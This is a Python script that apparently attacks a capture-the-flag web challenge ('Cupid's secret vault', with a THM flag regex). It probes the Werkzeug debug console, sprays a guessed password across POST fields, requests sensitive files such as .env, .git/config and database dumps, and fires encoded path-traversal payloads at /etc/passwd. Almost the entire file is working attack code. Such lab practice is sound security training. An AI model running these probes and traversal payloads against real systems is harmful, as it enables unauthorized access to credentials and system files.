import requests
import re

BASE = "http://10.114.139.59:5000"
FLAG_RE = re.compile(r"THM\{[^}]+\}")
s = requests.Session()

# 1) Full HTML dump of all accessible pages with headers
print("=== Full page analysis ===")
for path in ["/", "/cupids_secret_vault/", "/robots.txt"]:
    r = s.get(f"{BASE}{path}", timeout=10)
    print(f"\n--- {path} ({r.status_code}) ---")
    print(f"Headers: {dict(r.headers)}")
    print(f"Cookies: {dict(r.cookies)}")
    print(f"Full body ({len(r.text)} bytes):\n{r.text}")
    print("---")

# 2) Check for HTML comments specifically
print("\n=== HTML comments ===")
for path in ["/", "/cupids_secret_vault/"]:
    r = s.get(f"{BASE}{path}", timeout=10)
    comments = re.findall(r'<!--(.*?)-->', r.text, re.DOTALL)
    if comments:
        for c in comments:
            print(f"  {path}: <!-- {c.strip()} -->")
    else:
        print(f"  {path}: no comments found")

# 3) Set-Cookie analysis  
print("\n=== Cookie analysis ===")
r1 = s.get(f"{BASE}/", timeout=10)
r2 = s.get(f"{BASE}/cupids_secret_vault/", timeout=10)
print(f"  After /: cookies = {dict(s.cookies)}")
print(f"  All Set-Cookie headers: {r1.headers.get('Set-Cookie', 'none')}")

# 4) Werkzeug console deep probe
print("\n=== Werkzeug console deep probe ===")
# Try POST
r = s.post(f"{BASE}/console", timeout=5)
print(f"  POST /console -> {r.status_code}: {r.text[:200]}")

# Try with proper headers
headers_tests = [
    {"Content-Type": "application/x-www-form-urlencoded"},
    {"Content-Type": "application/json"},
    {"X-Requested-With": "XMLHttpRequest"},
]
for h in headers_tests:
    r = s.get(f"{BASE}/console", headers=h, timeout=5)
    print(f"  GET /console with {h} -> {r.status_code}: {r.text[:100]}")

# Try with cookie set
s.cookies.set("__wzd", "cupid_arrow_2026!!!")
r = s.get(f"{BASE}/console", timeout=5)
print(f"  GET /console with __wzd cookie -> {r.status_code}: {r.text[:200]}")

# Check if there's a specific path pattern for werkzeug
for p in ["/console/", "/console/pin", "/__debugger__", "/_debug"]:
    r = s.get(f"{BASE}{p}", timeout=5)
    print(f"  {p} -> {r.status_code}")
    if r.status_code not in [404, 400]:
        print(f"    {r.text[:200]}")

# 5) Try POST requests to vault
print("\n=== POST to vault ===")
# Maybe the vault accepts POST with the password
post_tests = [
    {"password": "cupid_arrow_2026!!!"},
    {"key": "cupid_arrow_2026!!!"},
    {"secret": "cupid_arrow_2026!!!"},
    {"pin": "cupid_arrow_2026!!!"},
    {"code": "cupid_arrow_2026!!!"},
    {"answer": "cupid_arrow_2026!!!"},
    {"access_code": "cupid_arrow_2026!!!"},
    {"passphrase": "cupid_arrow_2026!!!"},
]

default_vault = s.get(f"{BASE}/cupids_secret_vault/", timeout=5)
for data in post_tests:
    r = s.post(f"{BASE}/cupids_secret_vault/", data=data, timeout=5)
    if r.text != default_vault.text or r.status_code != 200:
        print(f"  POST {data} -> {r.status_code} ({len(r.text)} bytes)")
        print(f"    {r.text[:300]}")
        for f in FLAG_RE.findall(r.text):
            print(f"    [FLAG] {f}")
    else:
        print(f"  POST {data} -> same as default")

# Also JSON POST
for data in post_tests:
    r = s.post(f"{BASE}/cupids_secret_vault/", json=data, timeout=5)
    if r.text != default_vault.text or r.status_code != 200:
        print(f"  JSON POST {data} -> {r.status_code} ({len(r.text)} bytes)")
        print(f"    {r.text[:300]}")
        for f in FLAG_RE.findall(r.text):
            print(f"    [FLAG] {f}")

# 6) Try POST to root
print("\n=== POST to / ===")
for data in post_tests:
    r = s.post(f"{BASE}/", data=data, timeout=5, allow_redirects=False)
    default_root = s.get(f"{BASE}/", timeout=5)
    if len(r.text) != len(default_root.text) or r.status_code not in [200, 404]:
        print(f"  POST {data} -> {r.status_code} ({len(r.text)} bytes)")
        print(f"    {r.text[:300]}")

# 7) Look for .env, .git, backup files
print("\n=== Sensitive files ===")
sensitive = [
    "/.env", "/.git/HEAD", "/.git/config", "/app.py", "/main.py",
    "/server.py", "/requirements.txt", "/Procfile", "/Dockerfile",
    "/docker-compose.yml", "/.dockerenv", "/config.py", "/config.ini",
    "/settings.py", "/.htaccess", "/web.config", "/sitemap.xml",
    "/crossdomain.xml", "/.well-known/security.txt",
    "/backup.zip", "/app.zip", "/site.zip", "/dump.sql",
    "/flag.txt", "/flag", "/secret.txt", "/secret",
    "/admin", "/admin/", "/login", "/login/",
    "/api", "/api/", "/api/v1", "/api/v1/",
    "/graphql", "/graphql/", "/swagger", "/swagger/",
    "/openapi.json", "/api-docs",
    "/health", "/healthz", "/ready", "/status",
    "/metrics", "/prometheus",
    "/wp-admin", "/wp-login.php",  # just in case
    "/actuator", "/actuator/env",
    "/debug", "/debug/", "/test", "/test/",
    "/.DS_Store", "/thumbs.db",
    "/favicon.ico",
    "/sitemap.xml",
]
for p in sensitive:
    try:
        r = s.get(f"{BASE}{p}", timeout=3, allow_redirects=False)
        if r.status_code != 404:
            body = r.text[:100].replace("\n", " ")
            print(f"  {p} -> {r.status_code} ({len(r.text)} bytes) | {body}")
    except:
        pass

# 8) Check /cupids_secret_vault without trailing slash
print("\n=== Trailing slash behavior ===")
r1 = s.get(f"{BASE}/cupids_secret_vault", timeout=5, allow_redirects=False)
print(f"  /cupids_secret_vault (no slash) -> {r1.status_code}")
if r1.status_code in [301, 302, 308]:
    print(f"    Redirect to: {r1.headers.get('Location')}")
print(f"    Body: {r1.text[:200]}")

# 9) Try URL-encoded path traversal from vault
print("\n=== URL-encoded path traversal ===")
traversals = [
    "/cupids_secret_vault/....//....//etc/passwd",
    "/cupids_secret_vault/%2e%2e/%2e%2e/etc/passwd",
    "/cupids_secret_vault/..;/..;/etc/passwd",
    "/cupids_secret_vault/..%252f..%252fetc/passwd",
    "/cupids_secret_vault/..%c0%af..%c0%afetc/passwd",
    "//cupids_secret_vault/../../etc/passwd",
]
for t in traversals:
    try:
        r = s.get(f"{BASE}{t}", timeout=5, allow_redirects=False)
        if r.status_code != 404 and "root:" in r.text:
            print(f"  {t} -> HIT! {r.status_code} ({len(r.text)} bytes)")
            print(f"    {r.text[:300]}")
    except:
        pass

print("\nDone.")
